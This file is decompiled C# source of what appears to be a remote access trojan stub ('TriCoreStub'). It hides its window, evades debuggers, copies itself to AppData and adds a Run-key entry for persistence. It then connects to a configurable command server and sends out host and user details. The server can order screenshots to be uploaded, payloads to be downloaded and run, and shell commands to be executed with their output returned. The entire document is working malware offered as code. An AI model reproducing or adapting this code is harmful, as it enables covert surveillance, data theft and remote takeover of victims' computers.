using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using TriCoreStub.My;

namespace TriCoreStub;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	private string server;

	private int port;

	private string errorMsg;

	private string errorMsg2;

	private string errorMsgTitle;

	private TcpClient client;

	private NetworkStream _NetworkStream;

	private StreamReader sr;

	private StreamWriter sw;

	private BinaryReader br;

	private BinaryWriter bw;

	private string[] args;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		server = "127.0.0.1\0xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
		port = 1337;
		errorMsg = "0";
		errorMsg2 = "\0xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
		errorMsgTitle = "\0xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
		client = new TcpClient();
		args = new string[11];
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(284, 22);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool IsDebuggerPresent();

	private Bitmap MakeScreenShot()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
		Bitmap val = new Bitmap(bounds.Width, bounds.Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			val2.CopyFromScreen(0, 0, 0, 0, ((Image)val).get_Size());
			return val;
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}

	public void GetArgs(string cmd, int n)
	{
		int i = 5;
		int num = 0;
		checked
		{
			do
			{
				args[num] = "";
				num++;
			}
			while (num <= 9);
			args[0] = Strings.Mid(cmd, 1, 3).ToUpper();
			int num2 = n - 1;
			for (int j = 1; j <= num2; j++)
			{
				for (; Operators.CompareString(Strings.Mid(cmd, i, 1), ",", false) != 0; i++)
				{
					string[] array = args;
					int num3 = j;
					array[num3] = args[num3] + Strings.Mid(cmd, i, 1);
				}
				i += 2;
			}
			for (; Operators.CompareString(Strings.Mid(cmd, i, 1), "-", false) != 0; i++)
			{
				string[] array2 = args;
				int num3 = n;
				array2[num3] = args[num3] + Strings.Mid(cmd, i, 1);
			}
		}
	}

	private ManagementObject getHWID()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMedia");
		ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
		try
		{
			enumerator = val.Get().GetEnumerator();
			if (enumerator.MoveNext())
			{
				return (ManagementObject)enumerator.get_Current();
			}
			ManagementObject result = default(ManagementObject);
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public bool RegWrite(string Path, string Value, string Typ = "REG_SZ")
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag;
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
					object[] array = new object[3] { Path, Value, Typ };
					bool[] array2 = new bool[3] { true, true, true };
					NewLateBinding.LateCall(objectValue, (Type)null, "RegWrite", array, (string[])null, (Type[])null, array2, true);
					if (array2[0])
					{
						Path = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
					}
					if (array2[1])
					{
						Value = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
					}
					if (array2[2])
					{
						Typ = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[2]), typeof(string));
					}
					flag = true;
					goto end_IL_0000;
				}
				case 208:
					num = -1;
					switch (num2)
					{
					case 2:
						flag = false;
						goto end_IL_0000;
					}
					break;
				}
				goto IL_010a;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 208;
				continue;
			}
			break;
			IL_010a:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_029b: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0325: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).set_Visible(false);
		if (IsDebuggerPresent())
		{
			ProjectData.EndApp();
		}
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winxld32.exe"))
		{
			FileSystem.FileCopy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winxld32.exe");
			RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinXLD Service", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winxld32.exe");
		}
		if (Operators.CompareString(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winxld32.exe", false) != 0 && Operators.CompareString(errorMsg, "1", false) == 0)
		{
			Interaction.MsgBox((object)errorMsg2, (MsgBoxStyle)16, (object)errorMsgTitle);
		}
		while (!client.Connected)
		{
			try
			{
				client.Connect(server, port);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		_NetworkStream = client.GetStream();
		sr = new StreamReader(_NetworkStream);
		sw = new StreamWriter(_NetworkStream);
		br = new BinaryReader(_NetworkStream);
		bw = new BinaryWriter(_NetworkStream);
		sw.WriteLine("PNG " + Environment.MachineName + ", " + Environment.UserName + ", " + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName() + ", " + Application.get_CurrentCulture().ThreeLetterISOLanguageName + ", " + ((ManagementBaseObject)getHWID()).get_Item("SerialNumber").ToString() + "+");
		sw.Flush();
		try
		{
			while (Operators.CompareString(sr.ReadLine()!.ToUpper(), "CON", false) != 0)
			{
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		string text = default(string);
		while (true)
		{
			try
			{
				while (true)
				{
					text += sr.ReadLine();
					if (Operators.CompareString(Strings.Mid(text, Strings.Len(text), 1), "-", false) != 0)
					{
						text += "\r\n";
						continue;
					}
					break;
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				break;
			}
			switch (Strings.Mid(text, 1, 3).ToUpper())
			{
			case "MSG":
			{
				GetArgs(text, 3);
				object obj = Conversion.Int((object)args[3]);
				if (Operators.ConditionalCompareObjectEqual(obj, (object)0, false))
				{
					Interaction.MsgBox((object)args[1], (MsgBoxStyle)0, (object)args[2]);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj, (object)1, false))
				{
					Interaction.MsgBox((object)args[1], (MsgBoxStyle)64, (object)args[2]);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj, (object)2, false))
				{
					Interaction.MsgBox((object)args[1], (MsgBoxStyle)48, (object)args[2]);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj, (object)3, false))
				{
					Interaction.MsgBox((object)args[1], (MsgBoxStyle)16, (object)args[2]);
				}
				break;
			}
			case "SCR":
			{
				((Image)MakeScreenShot()).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\$tmp2a8b.bmp", ImageFormat.get_Bmp());
				byte[] array = File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\$tmp2a8b.bmp");
				sw.WriteLine(Conversion.Hex(array.Length));
				sw.Flush();
				bw.BaseStream.Write(array, 0, array.Length);
				bw.BaseStream.Flush();
				break;
			}
			case "DAR":
			{
				int count = Convert.ToInt32(Conversions.ToDecimal("&H" + sr.ReadLine()));
				File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\windar32.exe", br.ReadBytes(count));
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\windar32.exe");
				break;
			}
			case "CMD":
				GetArgs(text, 1);
				File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ix9b8.bat", args[1] + ">" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\cmdb.txt");
				Interaction.Shell(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ix9b8.bat", (AppWinStyle)0, false, -1);
				Thread.Sleep(2000);
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\cmdb.txt"))
				{
					sw.WriteLine(Conversion.Hex(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\cmdb.txt").Length));
					sw.Flush();
					sw.Write(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\cmdb.txt"));
					sw.Flush();
				}
				else
				{
					sw.WriteLine(Conversion.Hex(0));
					sw.Flush();
					sw.WriteLine("");
					sw.Flush();
				}
				FileSystem.Kill(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\cmdb.txt");
				FileSystem.Kill(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ix9b8.bat");
				break;
			}
			text = "";
			Application.DoEvents();
		}
	}
}
